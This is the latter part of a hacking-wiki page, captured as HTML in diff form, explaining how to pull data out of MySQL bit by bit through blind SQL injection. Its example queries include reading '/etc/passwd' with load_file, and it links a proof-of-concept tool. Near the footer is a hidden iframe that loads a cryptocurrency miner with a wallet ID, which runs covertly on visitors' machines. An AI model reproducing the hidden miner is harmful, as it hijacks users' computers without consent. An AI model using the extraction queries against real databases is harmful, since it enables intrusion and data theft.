+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">1</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span>;
+ <span class="sy0">+</span><span class="co1">-------------------------------------------------+</span>
+ <span class="sy0">|</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">1</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">-------------------------------------------------+ </span>
+ <span class="sy0">|</span> <span class="nu0">13614</span>                                           <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">-------------------------------------------------+</span>
+ <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>Suppose there was only enough room for 10 bits.  When selecting 2 bytes, 16 bits are retrieved.  To <a href="/Bit_shift" title="Bit shift" class="mw-redirect">shift</a> the value of the first sixteen bits by 6 bits to the right (grabbing only the first 10 bits):
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">1</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span> <span class="sy0">&gt;&gt;</span> 0x6;
+ <span class="sy0">+</span><span class="co1">--------------------------------------------------------+</span>
+ <span class="sy0">|</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">1</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span> <span class="sy0">&gt;&gt;</span> 0x6 <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">--------------------------------------------------------+</span>
+ <span class="sy0">|</span>                                                    <span class="nu0">212</span> <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">--------------------------------------------------------+</span>
+ <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.01</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>To get the next ten bits, (bits 11 through 20),  we start at the third bit (shift left 0x2) in the second byte of the string, continuing until halfway through the third byte (shift right 0x4, shift right 0x2 to fix shift left):
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">2</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span> <span class="sy0">&lt;&lt;</span> 0x2 <span class="sy0">&gt;&gt;</span> 0x6;
+ <span class="sy0">+</span><span class="co1">---------------------------------------------------------------+</span>
+ <span class="sy0">|</span> conv<span class="br0">&#40;</span>hex<span class="br0">&#40;</span>substr<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="nu0">2</span> <span class="kw1">FOR</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="nu0">16</span><span class="sy0">,</span><span class="nu0">10</span><span class="br0">&#41;</span> <span class="sy0">&lt;&lt;</span> 0x2 <span class="sy0">&gt;&gt;</span> 0x6 <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">---------------------------------------------------------------+</span>
+ <span class="sy0">|</span>                                                           <span class="nu0">739</span> <span class="sy0">|</span>
+ <span class="sy0">+</span><span class="co1">---------------------------------------------------------------+</span>
+ <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>And so on and so forth.
+</p>
+<h3> <span class="mw-headline" id="Compression"> Compression </span></h3>
+<p>It is possible to utilize server-side compression before extracting the <a href="/Binary" title="Binary" class="mw-redirect">binary</a> data from the <a href="/Database" title="Database">database</a>, then decompress it locally:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> uncompress<span class="br0">&#40;</span>compress<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;
+  <span class="sy0">+</span><span class="co1">---------------------------------+</span>
+  <span class="sy0">|</span> uncompress<span class="br0">&#40;</span>compress<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">---------------------------------+</span>
+  <span class="sy0">|</span> 5<span class="sy0">.</span>1<span class="sy0">.</span>61<span class="sy0">-</span><span class="nu0">0</span><span class="sy0">+</span>squeeze1               <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">---------------------------------+</span>
+  <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>On smaller pieces of data, this can actually lose out on performance:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>compress<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;
+  <span class="sy0">+</span><span class="co1">-----------------------------+</span>
+  <span class="sy0">|</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>compress<span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">-----------------------------+</span>
+  <span class="sy0">|</span>                          <span class="nu0">29</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">-----------------------------+</span>
+  <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span>
+&#160;
+  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;
+  <span class="sy0">+</span><span class="co1">-------------------+</span>
+  <span class="sy0">|</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>version<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">-------------------+</span>
+  <span class="sy0">|</span>                <span class="nu0">17</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">-------------------+</span>
+  <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>However on larger pieces of data, the compression can significantly increase efficiency:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>load_file<span class="br0">&#40;</span><span class="st0">'/etc/passwd'</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;
+  <span class="sy0">+</span><span class="co1">----------------------------------+</span>
+  <span class="sy0">|</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>load_file<span class="br0">&#40;</span><span class="st0">'/etc/passwd'</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">----------------------------------+</span>
+  <span class="sy0">|</span>                             <span class="nu0">1225</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">----------------------------------+</span>
+  <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span>
+&#160;
+  mysql<span class="sy0">&gt;</span> <span class="kw1">SELECT</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>compress<span class="br0">&#40;</span>load_file<span class="br0">&#40;</span><span class="st0">'/etc/passwd'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;
+  <span class="sy0">+</span><span class="co1">--------------------------------------------+</span>
+  <span class="sy0">|</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span>compress<span class="br0">&#40;</span>load_file<span class="br0">&#40;</span><span class="st0">'/etc/passwd'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">--------------------------------------------+</span>
+  <span class="sy0">|</span>                                        <span class="nu0">535</span> <span class="sy0">|</span>
+  <span class="sy0">+</span><span class="co1">--------------------------------------------+</span>
+  <span class="nu0">1</span> <span class="kw1">ROW</span> <span class="kw1">IN</span> <span class="kw1">SET</span> <span class="br0">&#40;</span><span class="nu0">0.00</span> sec<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Proof_of_concept"> Proof of concept </span></h2>
+<dl><dd><i>Main article: <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a></i>
+</dd></dl>
+<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
+</td>
+<td><center>End user is responsible for his or her own actions when using this software.  It is a crime to use this software against any system that you do not own without written consent.</center>
+</td></tr></table>
+<h3> <span class="mw-headline" id="Video"> Video </span></h3>
+<pre><a href="http://ascii.io/a/1588" class="external free" rel="nofollow">http://ascii.io/a/1588</a>
+</pre>
+<h3> <span class="mw-headline" id="Download"> Download </span></h3>
+<ul><li> <a href="/Sqli-hap.py" title="Sqli-hap.py">sqli-hap.py</a>&#160;: <a href="/Sqli-hap.py_source" title="Sqli-hap.py source" class="mw-redirect">source</a> - <a href="/Download_sqli-happy" title="Download sqli-happy">direct download</a> - <a href="/Download_mysqli-blindutils" title="Download mysqli-blindutils">download mysqli-blindutils</a>
+</li></ul>
+<h2> <span class="mw-headline" id="Related"> Related </span></h2>
+<h3> <span class="mw-headline" id="Tools_.26_Articles"> Tools &amp; Articles </span></h3>
+<ul><li> <a href="/Talk:Comparative_precomputation" title="Talk:Comparative precomputation" class="mw-redirect">A walkthrough - questions can be asked here!</a>
+</li><li> <a href="/Timing_based_extraction" title="Timing based extraction" class="mw-redirect">Timing based extraction</a>
+</li><li> <a href="/Blind_SQL_injection" title="Blind SQL injection" class="mw-redirect">Blind SQL injection</a>
+</li><li> <a href="/SQL_injection" title="SQL injection">SQL injection</a>
+</li><li> <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a>
+</li><li> <a href="/SQL_backdoor" title="SQL backdoor">SQL backdoors</a>
+</li></ul>
+<h3> <span class="mw-headline" id="Further_reading"> Further reading </span></h3>
+<ul><li> <a href="/SQL_orientation" title="SQL orientation">SQL orientation</a>
+</li><li> <a href="/MySQL" title="MySQL">MySQL</a>
+</li><li> <a href="/MySQL_Troubleshooting" title="MySQL Troubleshooting">MySQL Troubleshooting</a>
+</li></ul>
+<p><br />
+</p>
+<center><script type="text/javascript">
+function toggle() {
+   $('#display_text').html($('#hidden_display').html());
+   $('#hidetext').html($('#hide_msg').html());
+   $('#hidetext').attr('onClick','vape();');
+}
+function vape() {
+   $('#display_text').html('');
+   $('#hidetext').html($('#show_msg').html());
+   $('#hidetext').attr('onClick','toggle();');
+}
+</script><div style="width:40%; border: 1px solid #000; padding:0px 0px 0px 0px;">SQL injection/Blind/Comparative precomputation is part of a series on <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a>.<br />
+<a id='hidetext' onclick="toggle();"><b>[ CrackMe ]</b></a><br /><div id="display_text"></div></div>
+<div id="hidden_display" style="display:none; height:1px; width:1px">
+<div style="padding:2px;">
+<p><b><a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">Web Exploitation</a></b><br />
+<a href="/XSS" title="XSS">XSS</a> &#8226; <a href="/SQL_injection" title="SQL injection">SQL injection</a> &#8226; <a href="/CSRF" title="CSRF">CSRF</a> &#8226; <a href="/XSRF" title="XSRF">XSRF</a> &#8226; <a href="/Cookies" title="Cookies">Cookies</a> &#8226; <a href="/File_Inclusion" title="File Inclusion">File Inclusion</a> &#8226; <a href="/Command_Injection" title="Command Injection">Command Injection</a> <br />
+<a href="/XSCF" title="XSCF">XSCF</a> &#8226; <a href="/Cold_Fusion_Hacking" title="Cold Fusion Hacking" class="mw-redirect">Cold Fusion Hacking</a> &#8226; <a href="/RoR_Patching#Params_Injection_.26_Mass_Assignment_Abuse" title="RoR Patching">Mass Assignment Abuse</a> &#8226; <a href="/Lfi_autopwn.pl" title="Lfi autopwn.pl">Lfi_autopwn.pl</a> <br />
+<a href="/MySql_5_Enumeration" title="MySql 5 Enumeration" class="mw-redirect">Mysql5 Enumerator</a> &#8226; <a href="/Vanguard" title="Vanguard">Vanguard</a>
+</p><p><b>Software Exploitation</b><br />
+<a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">Buffer Overflows</a> &#8226; <a href="/Ascii_shellcode" title="Ascii shellcode">ascii shellcode(32 bit)</a> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">alphanumeric shellcode(64-bit)</a> &#8226; <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">Unsafe string replacement</a> &#8226; <a href="/Filter_bypass" title="Filter bypass">filter bypass</a> &#8226; <a href="/IDS_evasion" title="IDS evasion">IDS evasion</a> &#8226; <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>
+</p>
+</div></div><div style="visibility:hidden;height:1px;width:1px;"><div id="hide_msg" style="visibility:hidden;"><b>[ PatchMe ]</b></div><div id="show_msg" style="visibility:hidden;"><b>[ CrackMe ]</b></div></div></center>
+<p><br />
+</p><p><br />
+</p>
+<center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
+<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
+<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
+<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
+</div><div style="width: 25%; float: left; padding-top:5px;">
+<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
+(function() {
+  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = 'http://widgets.digg.com/buttons.js';
+  s1.parentNode.insertBefore(s, s1);
+})();
+</script></div>
+</div></span>
+</center>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 211/1000000
+Post-expand include size: 22766/2097152 bytes
+Template argument size: 1846/2097152 bytes
+Expensive parser function count: 0/100
+-->
+<div class="printfooter">
+Retrieved from "<a href="http://www.blackhatlibrary.net/SQL_injection/Blind/Comparative_precomputation">http://www.blackhatlibrary.net/SQL_injection/Blind/Comparative_precomputation</a>"</div>
+		<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/Special:Categories" title="Special:Categories">Categories</a>: <span dir='ltr'><a href="/Category:Exploitation" title="Category:Exploitation">Exploitation</a></span> | <span dir='ltr'><a href="/Category:Web_exploitation" title="Category:Web exploitation">Web exploitation</a></span> | <span dir='ltr'><a href="/Category:SQL_injection" title="Category:SQL injection">SQL injection</a></span></div></div>		<!-- end content -->
+				<div class="visualClear"></div>
+	</div>
+</div></div>
+<div id="column-one">
+	<div id="p-cactions" class="portlet">
+		<h5>Views</h5>
+		<div class="pBody">
+			<ul>
+				 <li id="ca-nstab-main" class="selected"><a href="/SQL_injection/Blind/Comparative_precomputation" title="View the content page [c]" accesskey="c">Page</a></li>
+				 <li id="ca-talk"><a href="/Talk:SQL_injection/Blind/Comparative_precomputation" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+				 <li id="ca-viewsource"><a href="/index.php?title=SQL_injection/Blind/Comparative_precomputation&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+				 <li id="ca-history"><a href="/index.php?title=SQL_injection/Blind/Comparative_precomputation&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-personal">
+		<h5>Personal tools</h5>
+		<div class="pBody">
+			<ul>
+				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=SQL_injection/Blind/Comparative_precomputation" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-logo">
+		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
+	</div>
+	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
+	<div class='generated-sidebar portlet' id='p-Wiki'>
+		<h5>Wiki</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
+				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
+				<li id="n-Donate"><a href="/Donations">Donate</a></li>
+				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
+				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
+				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class='generated-sidebar portlet' id='p-Community'>
+		<h5>Community</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
+				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
+				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
+			</ul>
+		</div>
+	</div>
+	<div id="p-search" class="portlet">
+		<h5><label for="searchInput">Search</label></h5>
+		<div id="searchBody" class="pBody">
+			<form action="/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
+				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
+				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
+			</form>
+		</div>
+	</div>
+	<div class="portlet" id="p-tb">
+		<h5>Toolbox</h5>
+		<div class="pBody">
+			<ul>
+				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/SQL_injection/Blind/Comparative_precomputation" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/SQL_injection/Blind/Comparative_precomputation" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
+				<li id="t-print"><a href="/index.php?title=SQL_injection/Blind/Comparative_precomputation&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=SQL_injection/Blind/Comparative_precomputation&amp;oldid=41491" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
+		</div>
+	</div>
+&nbsp;
+
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+/* BHL Sidebar */
+google_ad_slot = "2730381272";
+google_ad_width = 120;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<center>VPS-Heaven now accepting BitCoin!</center><br />
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-40369725-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
+<br /><br /><center>Our research is made possible by your support.</center><br />
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
+<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+</form>
+</div><!-- end of the left (by default at least) column -->
+<div class="visualClear"></div>
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
+<div id="footer">
+	<div id="f-poweredbyico">
+		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+	</div>
+	<ul id="f-list">
+		<li id="lastmod"> This page was last modified on 19 October 2013, at 00:54.</li>
+		<li id="viewcount">This page has been accessed 9,174 times.</li>
+		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
+		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
+		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
+<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>
+
+	</ul>
+</div>
+</div>
+
+<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "SQL_injection/Blind/Comparative_precomputation", "wgTitle": "SQL injection/Blind/Comparative precomputation", "wgAction": "view", "wgArticleId": 1553, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 41491, "wgCategories": ["Exploitation", "Web exploitation", "SQL injection"], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script type="text/javascript"> 
+function toggleDisplay( id, hidetext, showtext )
+{
+  link = document.getElementById( id + "l" ).childNodes[0];
+ 
+  with( document.getElementById( id ).style )
+    {
+      if( display == "none" )
+	{
+	  display = "inline";
+	  link.nodeValue = hidetext;
+	}
+      else
+	{
+	  display = "none";
+	  link.nodeValue = showtext;
+	}
+    }
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script><!-- Served in 1.254 secs. --></body></html>
